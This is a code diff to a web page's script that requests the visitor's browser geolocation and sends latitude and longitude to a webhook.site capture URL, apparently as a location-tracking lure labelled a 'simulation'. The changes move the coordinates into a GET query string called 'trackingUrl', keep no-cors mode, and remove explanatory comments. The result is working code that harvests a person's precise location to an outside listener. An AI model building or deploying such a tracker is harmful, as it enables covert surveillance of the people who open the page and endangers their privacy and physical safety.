@@ -54,7 +54,7 @@
 </div>
 
 <script>
-    // Connected to your active Webhook dashboard session
+    // Your active Webhook dashboard link
     const webHookUrl = "https://webhook.site/dcd725fb-ad14-4518-8994-9b0dd39a17a8";
 
     function startSimulation() {
@@ -63,7 +63,6 @@
         status.style.color = "#007aff";
 
         if (navigator.geolocation) {
-            // Triggers the mandatory native browser security prompt
             navigator.geolocation.getCurrentPosition(sendData, handleDenied);
         } else {
             status.innerHTML = "Error: Geolocation is not supported by this browser.";
@@ -71,23 +70,20 @@
         }
     }
 
+    // --- THIS IS THE UPDATED SENDDATA FUNCTION ---
     function sendData(position) {
         const status = document.getElementById("status-message");
         status.innerHTML = "Transmission initiated...";
 
-        const payload = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy_meters: position.coords.accuracy,
-            timestamp: new Date().toISOString()
-        };
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
 
-        // Transmit data cleanly using no-cors mode to prevent preflight block
-        fetch(webHookUrl, {
-            method: "POST",
-            mode: "no-cors",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
+        // This clean connection appends the coordinates safely to the end of the URL
+        const trackingUrl = webHookUrl + "?latitude=" + lat + "&longitude=" + lon;
+
+        fetch(trackingUrl, {
+            method: "GET",
+            mode: "no-cors"
         })
         .then(response => {
             status.innerHTML = "Success: Coordinates sent to listener dashboard.";
@@ -96,7 +92,6 @@
         .catch(error => {
             status.innerHTML = "Network Error: Transmission failed.";
             status.style.color = "#ff3b30";
-            console.error('Error details:', error);
         });
     }
 
